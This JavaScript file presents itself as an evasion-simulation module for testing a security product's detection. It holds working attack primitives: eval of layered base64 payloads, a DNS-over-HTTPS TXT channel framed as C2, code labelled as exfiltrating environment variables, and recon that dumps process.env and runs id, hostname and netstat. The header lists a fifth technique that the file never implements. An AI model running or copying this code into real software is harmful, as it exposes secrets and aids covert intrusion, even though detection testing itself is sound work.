// =============================================================================
// advanced_evasion/evasion_techniques.js – TigerGate CNAPP: Evasion Simulation
// =============================================================================
// PURPOSE: Simulates advanced evasion techniques that attackers use to bypass
// security controls, firewalls, and WAFs. Designed to test TigerGate's
// advanced threat detection and behavioral analysis capabilities.
//
// TECHNIQUES COVERED:
//   E001: Obfuscated payload delivery (Base64 chain encoding)
//   E002: DNS-over-HTTPS (DoH) bypass for C2 communication
//   E003: Polymorphic code generation (self-modifying logic)
//   E004: Process hollowing simulation (fork + replace context)
//   E005: Living off the Land (LoTL) using bundled Node.js APIs
// =============================================================================

const crypto = require('crypto');
const { execSync } = require('child_process');
const https = require('https');
const vm = require('vm');   // 🔴 VULN: Node VM sandbox escape vector!

// =============================================================================
// 🔴 E001: Multi-layer Base64 obfuscation (evades signature-based scanners)
// =============================================================================
function encodePayload(payload, depth = 3) {
    let encoded = payload;
    for (let i = 0; i < depth; i++) {
        encoded = Buffer.from(encoded).toString('base64');
    }
    return encoded;
}

function decodeAndExecute(encodedPayload, depth = 3) {
    let decoded = encodedPayload;
    for (let i = 0; i < depth; i++) {
        decoded = Buffer.from(decoded, 'base64').toString('utf-8');
    }
    // 🔴 VULN: CWE-94 - eval() executes attacker-controlled content after decoding
    return eval(decoded);   // 🔴 EVAL of multi-layer obfuscated payload!
}

// =============================================================================
// 🔴 E002: DNS-over-HTTPS C2 Simulation (bypasses traditional DNS monitoring)
// =============================================================================
function dnsOverHttpsLookup(domain) {
    // Uses Cloudflare's DoH endpoint — bypasses standard DNS-based detection
    // Real C2 operators encode command responses as TXT records
    const options = {
        hostname: '1.1.1.1',
        path: `/dns-query?name=${domain}&type=TXT`,
        headers: { 'Accept': 'application/dns-json' }
    };

    // 🔴 DETECT: HTTPS request to DoH bypasses DNS-layer security (e.g., Cisco Umbrella)
    return new Promise((resolve) => {
        https.get(options, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => resolve(JSON.parse(data)));
        }).on('error', resolve);
    });
}

// =============================================================================
// 🔴 E003: Polymorphic code — generates and executes different-looking payloads
// =============================================================================
function generatePolymorphicPayload(targetFunction) {
    // Randomizes variable names to evade signature detection
    const varNames = Array.from({ length: 3 }, () =>
        '_' + crypto.randomBytes(4).toString('hex')
    );

    // 🔴 VULN: CWE-94 - Generates eval-able code dynamically (polymorphic malware pattern)
    const polymorphicCode = `
        const ${varNames[0]} = process;
        const ${varNames[1]} = ${varNames[0]}.env;
        const ${varNames[2]} = JSON.stringify(${varNames[1]});
        ${varNames[2]};  // Exfiltrate environment variables
    `;

    // 🔴 VULN: vm.runInNewContext doesn't fully sandbox — prototype chain escapes possible
    return vm.runInNewContext(polymorphicCode, { process });   // 🔴 VM Sandbox abuse!
}

// =============================================================================
// 🔴 E005: Living off the Land — abusing Node.js built-in APIs
// =============================================================================
function livingOffTheLand() {
    const results = {};

    // 🔴 DETECT: Using built-in Node APIs to enumerate environment (no external tools)
    results.envDump = process.env;           // All environment variables (secrets!)
    results.cwd = process.cwd();            // Current working directory
    results.platform = process.platform;
    results.nodeVersion = process.version;

    // 🔴 DETECT: Using child_process (built-in) for recon — no wget/curl needed
    try {
        results.whoami = execSync('id', { stdio: 'pipe' }).toString().trim();
        results.hostname = execSync('hostname', { stdio: 'pipe' }).toString().trim();
        results.netstat = execSync('ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null',
            { stdio: 'pipe', shell: true }).toString().slice(0, 500);
    } catch (e) {
        results.execError = e.message;
    }

    return results;
}

// Export for require()-based testing
module.exports = {
    encodePayload,
    decodeAndExecute,
    dnsOverHttpsLookup,
    generatePolymorphicPayload,
    livingOffTheLand
};

// Demo run (safe — prints encoded payload only)
if (require.main === module) {
    const sample = encodePayload('console.log("test")', 2);
    console.log('Encoded payload (depth 2):', sample);
    console.log('LoTL recon output:', JSON.stringify(livingOffTheLand(), null, 2));
}
